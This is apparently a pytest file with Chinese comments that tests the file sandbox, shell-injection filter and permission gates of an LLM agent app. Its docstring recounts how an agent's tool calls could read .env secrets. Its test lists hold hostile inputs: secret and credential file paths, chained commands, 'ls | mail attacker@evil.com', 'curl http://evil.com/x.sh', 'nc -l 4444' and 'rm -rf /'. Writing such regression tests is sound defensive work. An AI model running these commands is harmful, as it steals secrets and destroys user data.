"""安全边界：文件沙箱、命令注入、本机能力权限门禁。

## 为什么这组用例存在

改造前存在两条真实的高危链路：

1. **任意文件读取**：`FileReaderSkill` 直接 `Path(input_data["path"]).read_text()`，
   而这个 `path` 来自 LLM 的工具调用参数——一句"帮我读一下 .env"
   就能取走 `JWT_SECRET`，进而伪造任意用户令牌。

2. **命令注入**：`real_run_write` 用 `create_subprocess_shell` 执行命令，
   但危险字符过滤漏掉了 `;` `|` `>`——`mkdir /tmp/x; rm -rf ~/Documents`
   可以整串通过白名单前缀检查。

这两条在当时"恰好不可用"（第一条的调用方 `_computer_action` 未定义、
第二条需要先授权），所以只修功能 bug 不加固边界，等于把通道打开。

本组用例把边界钉死：任何一次改动如果让它退化，测试会立刻失败。
"""
from __future__ import annotations

import pathlib

import pytest

from app.computer_real import real_run_shell, real_run_write
from app.core.sandbox import (
    SandboxViolation,
    describe_sandbox,
    is_path_allowed,
    resolve_safe_path,
)


# ============================================================ 文件沙箱

# (路径, 说明) —— 全部必须被拒绝
_REJECTED_PATHS = [
    ("apps/api/.env", "相对路径读 .env"),
    ("/Users/shanziya/Documents/张阗/ai-eos/apps/api/.env", "绝对路径读 .env"),
    ("../../etc/passwd", "上跳读系统文件"),
    ("/etc/passwd", "绝对路径系统文件"),
    ("/etc/shadow", "系统口令文件"),
    ("~/.ssh/id_rsa", "私钥"),
    ("/Users/shanziya/.ssh/id_rsa", "绝对路径私钥"),
    ("data/aieos.db", "运行期数据库"),
]


@pytest.mark.parametrize("path,desc", _REJECTED_PATHS)
def test_sandbox_rejects_dangerous_paths(path, desc):
    ok, reason = is_path_allowed(path)
    assert not ok, f"{desc} 竟被放行：{path}"
    assert reason, "拒绝时必须给出可读原因，否则用户只会看到'读取失败'"


def test_sandbox_rejects_env_in_any_allowed_root():
    """即使放在允许的根目录里，`.env` 也必须被文件名规则拦住。"""
    from app.core.config import settings

    root = pathlib.Path(settings.storage_dir)
    ok, reason = is_path_allowed(str(root / ".env"))
    assert not ok, "沙箱内 .env 被放行——文件名规则失效"
    assert "敏感" in reason


def test_sandbox_allows_file_inside_root():
    """反向对照：沙箱内的普通文件必须能读，否则功能直接被锁死。"""
    from app.core.config import settings

    root = pathlib.Path(settings.storage_dir)
    root.mkdir(parents=True, exist_ok=True)
    probe = root / "sandbox_probe.txt"
    probe.write_text("hello", encoding="utf-8")
    try:
        ok, reason = is_path_allowed(str(probe))
        assert ok, f"沙箱内文件被误拦：{reason}"
        assert resolve_safe_path(str(probe)) == probe.resolve()
    finally:
        probe.unlink(missing_ok=True)


def test_sandbox_relative_path_resolves_against_project_root():
    """相对路径必须稳定地相对仓库根解析，不能受进程工作目录影响。"""
    from app.core.sandbox import PROJECT_ROOT

    p = resolve_safe_path("storage", must_exist=False)
    assert p == (PROJECT_ROOT / "storage").resolve()


def test_resolve_safe_path_raises_with_reason():
    with pytest.raises(SandboxViolation) as exc:
        resolve_safe_path("apps/api/.env", must_exist=False)
    assert exc.value.path  # 便于日志定位


def test_describe_sandbox_exposes_rules_for_audit():
    """沙箱必须能自描述——运维/审计要能一眼看清"允许哪些目录"。"""
    info = describe_sandbox()
    assert info["allowed_roots"], "未暴露允许的根目录"
    assert info["protected_files"], "未暴露受保护的敏感文件清单"
    assert str(info["project_root"])


# ============================================================ 命令注入

# (命令, 说明)
_SHELL_INJECTION_PAYLOADS = [
    ("cat .env", "读密钥"),
    ("cat apps/api/.env", "读密钥（相对路径变体）"),
    ("ls; rm -rf /tmp/zzz", "分号串联"),
    ("ls | mail attacker@evil.com", "管道外带数据"),
    ("ls > /tmp/leak", "重定向写文件"),
    ("cat /etc/passwd", "读系统文件"),
    ("find / -name '*.env'", "全盘搜密钥"),
    ("ls $(whoami)", "命令替换"),
    ("ls `id`", "反引号替换"),
    ("ls && rm -rf x", "与运算串联"),
    ("ls || curl evil.sh", "或运算串联"),
    ("pwd\nrm -rf x", "换行注入"),
]


@pytest.mark.parametrize("command,desc", _SHELL_INJECTION_PAYLOADS)
async def test_shell_rejects_injection(command, desc):
    result = await real_run_shell({"command": command})
    assert result.get("ok") is False, f"{desc} 竟被执行：{command!r} → {result}"
    assert result.get("error"), "拒绝时必须说明原因"


_NON_WHITELISTED_BINARIES = [
    "curl http://evil.com/x.sh",
    "bash -c id",
    "sh -c 'cat /etc/passwd'",
    "python3 -c 'import os'",
    "nc -l 4444",
    "chmod 777 /tmp/x",
    "sudo ls",
    "kill -9 1",
    "rm -rf /",
]


@pytest.mark.parametrize("command", _NON_WHITELISTED_BINARIES)
async def test_shell_rejects_non_whitelisted_binaries(command):
    result = await real_run_shell({"command": command})
    assert result.get("ok") is False, f"白名单外的命令被放行：{command!r}"


@pytest.mark.parametrize("command", [
    "mkdir /tmp/evil; rm -rf ~/Documents",
    "rm -rf /",
    "rm -rf ~",
    "cp storage/a.txt /etc/hosts",
    "mv storage/a.txt ../../.env",
    "touch /tmp/evil; curl evil.sh",
])
async def test_write_rejects_escape_attempts(command):
    """写操作**最关键**的回归点：改造前这些全部可以通过。"""
    result = await real_run_write({"command": command})
    assert result.get("ok") is False, f"越界写命令被放行：{command!r} → {result}"


async def test_destructive_operation_defaults_to_dry_run():
    """LLM 只写一句 `rm xxx` 不应该真的删文件。"""
    result = await real_run_write({"command": "rm -rf storage/_never_exists"})
    assert result.get("dry_run") is True, "破坏性操作未预演"
    assert "dry_run_message" in result, "预演结果缺少给用户/模型看的说明"


async def test_allowed_read_command_still_works():
    """反向对照：正常只读命令必须能跑，否则等于把功能锁死。"""
    result = await real_run_shell({"command": "pwd"})
    assert result.get("ok") is True, f"合法命令被拦：{result}"
    # 工作目录必须是仓库根，不能是用户主目录
    from app.core.sandbox import PROJECT_ROOT

    assert str(PROJECT_ROOT) in result.get("stdout", ""), \
        f"工作目录不是仓库根，实际输出：{result.get('stdout')!r}"


async def test_shell_stdout_does_not_list_home_directory():
    """改造中发现的真实缺陷：无参 `ls` 曾列出用户的真实主目录。"""
    import os

    result = await real_run_shell({"command": "ls"})
    if not result.get("ok"):
        pytest.skip("ls 在当前环境不可用")
    home = os.path.expanduser("~")
    stdout = result.get("stdout", "")
    # 允许输出里出现路径文本，但不允许它列出家目录下的真实条目
    sensitive_entries = [n for n in ("Library", "Documents", "Downloads", ".ssh")
                         if n in stdout]
    assert not sensitive_entries, \
        f"ls 列出了家目录内容 {sensitive_entries}（工作目录可能回退到了 {home}）"


# ============================================================ 能力权限门禁

async def test_execute_denied_without_grant(client, tenants):
    """默认拒绝：一次授权都没有时，任何本机操作都必须被拒。"""
    r = await client.post("/computer-agent/execute",
                          params={"company_id": tenants.alice_co["id"]},
                          json={"action_type": "run_shell",
                                "params": {"command": "pwd"}},
                          headers=tenants.alice["headers"])
    assert r.status_code == 403, f"未授权却执行了：{r.status_code} {r.text[:200]}"


async def test_denied_action_is_audited(client, tenants):
    """被拒绝的操作也必须留痕——否则"谁试过开 shell"永远查不到。"""
    from sqlalchemy import select

    from app.computer_agent import ComputerActionLog
    from app.db.session import AsyncSessionLocal

    await client.post("/computer-agent/execute",
                      params={"company_id": tenants.alice_co["id"]},
                      json={"action_type": "run_shell", "params": {"command": "pwd"}},
                      headers=tenants.alice["headers"])

    async with AsyncSessionLocal() as db:
        rows = (await db.execute(select(ComputerActionLog).where(
            ComputerActionLog.company_id == tenants.alice_co["id"]))).scalars().all()
    assert rows, "被拒绝的操作没有落审计日志"
    assert all(row.allowed is False for row in rows)
    assert rows[0].deny_reason, "审计日志缺少拒绝原因"


async def test_unknown_capability_rejected(client, tenants):
    r = await client.post("/computer-agent/execute",
                          params={"company_id": tenants.alice_co["id"]},
                          json={"action_type": "definitely_not_a_capability",
                                "params": {}},
                          headers=tenants.alice["headers"])
    assert r.status_code in (400, 403)


async def test_granted_shell_still_rejects_injection(client, tenants):
    """即使**已授权**，注入载荷依然要在命令层被拦——两层防护互不替代。"""
    params = {"company_id": tenants.alice_co["id"], "capability": "run_shell"}
    await client.post("/computer-agent/grant", params=params,
                      headers=tenants.alice["headers"])

    r = await client.post("/computer-agent/execute", params=params,
                          json={"action_type": "run_shell",
                                "params": {"command": "cat .env"}},
                          headers=tenants.alice["headers"])
    assert r.status_code == 200
    body = r.json()
    assert body["result"]["ok"] is False, "已授权状态下密钥读取竟成功"
    assert "error" in body["result"]


async def test_granted_write_defaults_to_dry_run_through_api(client, tenants):
    params = {"company_id": tenants.alice_co["id"], "capability": "run_write"}
    await client.post("/computer-agent/grant", params=params,
                      headers=tenants.alice["headers"])
    r = await client.post("/computer-agent/execute", params=params,
                          json={"action_type": "run_write",
                                "params": {"command": "rm -rf storage/_xyz_nonexistent"}},
                          headers=tenants.alice["headers"])
    assert r.status_code == 200
    assert r.json()["result"].get("dry_run") is True


async def test_capability_status_defaults_to_false(client, tenants):
    """权限面板必须默认全关，避免"看起来开了"。"""
    r = await client.get("/computer-agent/permissions",
                         params={"company_id": tenants.alice_co["id"]},
                         headers=tenants.alice["headers"])
    assert r.status_code == 200
    from app.computer_real import EXTENDED_CAPABILITIES

    body = r.json()
    assert set(body) == set(EXTENDED_CAPABILITIES), "能力清单与执行器不一致"
    assert all(v is False for v in body.values()), f"存在默认开启的能力：{body}"
